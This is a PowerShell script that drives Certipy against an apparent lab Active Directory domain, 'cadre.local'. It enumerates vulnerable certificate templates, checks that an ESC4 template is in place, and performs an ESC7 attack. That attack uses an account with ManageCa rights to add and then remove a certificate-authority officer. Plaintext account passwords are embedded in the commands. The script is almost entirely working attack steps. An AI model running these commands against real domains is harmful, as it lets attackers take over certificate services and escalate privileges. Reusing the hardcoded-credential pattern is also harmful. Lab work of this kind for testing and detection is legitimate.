$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack
Get-Process certipy -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

Write-Output "===== VERIFY CADRE-ESC4 restored (find -vulnerable) ====="
& $certpy find -u chief_command@cadre.local -p C0mm@nd_Ch1ef! -dc-ip 192.168.77.10 -vulnerable -stdout > esc4-verify-find.txt 2>&1
$t = Get-Content C:\Tools\cadre-attack\esc4-verify-find.txt -Raw
$idx = $t.IndexOf('CADRE-ESC4')
if ($idx -ge 0) {
  $seg = $t.Substring($idx, [Math]::Min(1800, $t.Length - $idx))
  $seg -split "`n" | Where-Object { $_ -match 'Template Name|Vulnerabilities|ESC1|ESC4|ESC2|ESC9' } | ForEach-Object { Write-Output $_.Trim() }
} else { Write-Output "CADRE-ESC4 NOT FOUND IN FIND" }

Write-Output ""
Write-Output "===== ESC7: add officer as lead_engineering (ManageCa proof) ====="
& $certpy ca -ca cadre-CA -u lead_engineering@cadre.local -p Eng_L3ad! -dc-ip 192.168.77.10 -add-officer hunter_dfir -dynamic-endpoint -timeout 25 2>&1 | Select-Object -Last 12
Write-Output "add_officer_rc=$LASTEXITCODE"

Write-Output "===== ESC7: remove officer (cleanup) ====="
Get-Process certipy -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
& $certpy ca -ca cadre-CA -u lead_engineering@cadre.local -p Eng_L3ad! -dc-ip 192.168.77.10 -remove-officer hunter_dfir -dynamic-endpoint -timeout 25 2>&1 | Select-Object -Last 12
Write-Output "remove_officer_rc=$LASTEXITCODE"

Write-Output "===== ESC7_DONE ====="
